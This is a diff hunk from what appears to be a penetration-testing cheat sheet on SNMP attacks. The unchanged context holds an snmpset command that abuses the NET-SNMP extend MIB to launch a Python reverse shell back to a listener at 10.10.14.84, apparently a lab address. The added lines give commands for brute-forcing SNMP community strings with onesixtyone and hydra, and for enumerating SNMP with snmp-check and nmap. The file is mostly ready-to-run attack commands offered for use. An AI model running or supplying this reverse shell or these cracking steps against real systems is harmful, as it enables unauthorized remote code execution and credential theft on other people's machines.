@@ -167,3 +167,15 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
 ### Or a reverse shell
 
  - snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
+
+## Crack SNMP Passwords
+
+ - onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {IP} -w 100
+
+ - hydra -P {Big_Passwordlist} -v {IP} snmp
+
+## Enumerate SNMP 
+
+ - snmp-check {IP}
+
+ - nmap --script "snmp* and not snmp-brute" {IP}
